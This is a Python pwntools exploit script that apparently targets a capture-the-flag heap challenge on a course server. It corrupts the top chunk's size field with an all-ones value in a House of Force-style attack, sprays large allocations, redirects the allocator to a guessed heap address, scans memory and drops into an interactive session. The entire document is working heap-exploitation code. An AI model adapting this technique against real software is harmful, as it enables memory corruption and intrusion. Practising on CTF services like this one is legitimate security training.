from pwn import *

context.arch='amd64'

import sys
if len(sys.argv) == 2:
    if sys.argv[1] == 'local':
        host = '127.0.0.1'
        port = 8888
    if sys.argv[1] == 'csie':
        host = 'csie.ctf.tw'
        port = 10141
else:
    print('Please tell me a server\'s name')
    sys.exit()

r = remote(host, port)

def allocate_heap(size, data, sendline=True, top=0, top_size=0):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if sendline:
        r.sendline(data)
    else:
        r.send(data)
    if top != 0:
        change = 0x10 + (size&0xfffffffffffffff0)
        return top + change, top_size - change

def show_heap():
    r.recvuntil(':')
    r.sendline(b'2')

def gen_new_top(new_top, data, old_top, old_top_size):
    nb = new_top - old_top - 0x10
    allocate_heap(nb, data)
    # print predicted
    new_top = old_top + (nb + 0x10)
    new_top_size = old_top_size - (nb + 0x10) % 0x10000000000000000
    return new_top, new_top_size

def overwrite_chunk_size():
    allocate_heap(0x18, b'c'*0x18 + p64(0xffffffffffffffff))
    r.recvuntil(':')

# for _ in range(12):
#     allocate_heap(0x21000, b'a')
# allocate_heap(0x28000, b'a')
# allocate_heap(0x1c1000, b'a')

total_iter = 30000
total_iter = 500
for i in range(1, total_iter+1):
    if i % 50 == 0: print('iter', i, '/', total_iter)
    allocate_heap(0x40000000, cyclic(i*4)[-4:]*(0x500//0x4))

# input('Check top')
# guess: guess_heap had been mmaped
guess_top = 0x1600000
guess_heap = 0x7f0000000000

# overwrite chunk size & go to guess heap
allocate_heap(0x30, b'a')
allocate_heap(0x30, b'a')
overwrite_chunk_size()
gen_new_top(guess_heap - 0x10, b'a', guess_top, 0xfffffffffffffff8)
allocate_heap(0x10, b'a', False)
show_heap()

input('check heap position')
# move up 0x10 to look for 'aaaaaaaa'
for i in range(0x500000):
    if i % 0x10 == 0: print(hex(i))
    allocate_heap(0x500, b'a', False)
    show_heap()
    recv = r.recvuntil('\n')[:-1]
    if recv !=  b' a':
        print('i =', hex(i))
        print('recv =', recv)
        break

r.interactive()
